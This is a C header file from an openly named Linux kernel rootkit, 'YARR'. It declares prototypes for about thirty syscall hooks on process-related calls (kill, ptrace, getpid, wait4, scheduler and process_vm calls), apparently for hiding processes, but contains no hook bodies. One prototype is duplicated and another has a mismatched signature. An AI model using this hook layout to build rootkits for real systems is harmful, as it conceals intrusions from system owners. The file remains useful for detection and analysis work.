/*
 *  YARR - Yet Another Repetitive Rootkit
 *  Copyright (C) 2011 Ole 
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 1, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

#ifndef __YARR_SYSCALL_HOOKS
#define __YARR_SYSCALL_HOOKS

#include <linux/resource.h>
#include <linux/sched.h>
#include <linux/perf_event.h>

extern void *syscalls_hooks[];

/***
 * Hook for sys_waitpid().
 */
asmlinkage long yarr_waitpid(pid_t pid, int __user *stat_addr, int options);

/***
 * Hook for sys_getpid().
 */
asmlinkage long yarr_getpid(void);

/***
 * Hook for sys_ptrace().
 */
asmlinkage long yarr_ptrace(long request, long pid, unsigned long addr,
							unsigned long data);

/***
 * Hook for sys_kill().
 */
asmlinkage long yarr_kill(int pid, int sig);

/***
 * Hook for sys_setpgid().
 */
asmlinkage long yarr_setpgid(pid_t pid, pid_t pgid);

/***
 * Hook for sys_getpriority().
 */
asmlinkage long yarr_getpriority(int which, int who);

/***
 * Hook for sys_setpriority().
 */
asmlinkage long yarr_setpriority(int which, int who, int niceval);

/***
 * Hook for sys_wait4().
 */
asmlinkage long yarr_wait4(pid_t pid, int __user *stat_addr, int options,
						   struct rusage __user *ru);

/***
 * Hook for sys_getpgid().
 */
asmlinkage long yarr_getpgid(pid_t pid);

/***
 * Hook for sys_getsid().
 */
asmlinkage long yarr_getsid(pid_t pid);

/***
 * Hook for sys_sched_setparam().
 */
asmlinkage long yarr_sched_setparam(pid_t pid,
									struct sched_param __user *param);

/***
 * Hook for sys_sched_getparam().
 */
asmlinkage long yarr_sched_getparam(pid_t pid,
									struct sched_param __user *param);

/***
 * Hook for sys_sched_setscheduler().
 */
asmlinkage long yarr_sched_setscheduler(pid_t pid, int policy,
										struct sched_param __user *param);

/***
 * Hook for sys_sched_getscheduler().
 */
asmlinkage long yarr_sched_getscheduler(pid_t pid);

/***
 * Hook for sys_sched_rr_get_interval().
 */
asmlinkage long yarr_sched_rr_get_interval(pid_t pid,
										   struct timespec __user *interval);

/***
 * Hook for sys_rt_sigqueueinfo().
 */
asmlinkage long yarr_rt_sigqueueinfo(int pid, int sig,
									 siginfo_t __user *uinfo);

/***
 * Hook for sys_sched_sigtimedwait().
 */
asmlinkage long yarr_sched_sigtimedwait(int pid, int sig,
										siginfo_t __user *uinfo);

/***
 * Hook for sys_tkill().
 */
asmlinkage long yarr_tkill(int pid, int sig);

/***
 * Hook for sys_sched_setaffinity().
 */
asmlinkage long yarr_sched_setaffinity(int pid, unsigned int len,
									   unsigned long __user *user_mask_ptr);

/***
 * Hook for sys_sched_getaffinity().
 */
asmlinkage long yarr_sched_getaffinity(int pid, unsigned int len,
									   unsigned long __user *user_mask_ptr);

/***
 * Hook for sys_tgkill().
 */
asmlinkage long yarr_tgkill(int tgid, int pid, int sig);

/***
 * Hook for sys_waitid().
 */
asmlinkage long yarr_waitid(int which, pid_t pid, struct siginfo __user *infop,
							int options, struct rusage __user *ru);

/***
 * Hook for sys_ioprio_set().
 */
asmlinkage long yarr_ioprio_set(int which, int who, int ioprio);

/***
 * Hook for sys_ioprio_get().
 */
asmlinkage long yarr_ioprio_get(int which, int who, int ioprio);

/***
 * Hook for sys_migrate_pages().
 */
asmlinkage long yarr_migrate_pages(pid_t pid, unsigned long maxnode,
								   const unsigned long __user *from,
								   const unsigned long __user *to);

/***
 * Hook for sys_migrate_pages().
 */
asmlinkage long yarr_migrate_pages(pid_t pid, unsigned long maxnode,
								   const unsigned long __user *from,
								   const unsigned long __user *to);

/***
 * Hook for sys_move_pages().
 */
asmlinkage long yarr_move_pages(pid_t pid, unsigned long nr_pages,
								const void __user * __user *pages,
								const int  __user *nodes,
								int __user *status, int flags);

/***
 * Hook for sys_rt_tgsigqueueinfo().
 */
asmlinkage long yarr_rt_tgsigqueueinfo(pid_t tgid, pid_t pid, int sig,
									   siginfo_t __user *uinfo);

/***
 * Hook for sys_perf_event_open().
 */
asmlinkage long yarr_perf_event_open(struct perf_event_attr __user *attr_uptr,
									 pid_t pid, int cpu, int group_fd,
									 unsigned long flags);

/***
 * Hook for sys_prlimit64().
 */
asmlinkage long yarr_prlimit64(pid_t pid, unsigned int resource,
							   const struct rlimit64 __user *new_rlim,
							   struct rlimit64 __user *old_rlim);

/***
 * Hook for sys_process_vm_readv().
 */
asmlinkage long yarr_process_vm_readv(pid_t pid,
									  const struct iovec __user *lvec,
									  unsigned long liovcnt,
									  const struct iovec __user *rvec,
									  unsigned long riovcnt,
									  unsigned long flags);

/***
 * Hook for sys_process_vm_writev().
 */
asmlinkage long yarr_process_vm_writev(pid_t pid,
									   const struct iovec __user *lvec,
									   unsigned long liovcnt,
									   const struct iovec __user *rvec,
									   unsigned long riovcnt,
									   unsigned long flags);

#endif /* __YARR_SYSCALL_HOOKS */

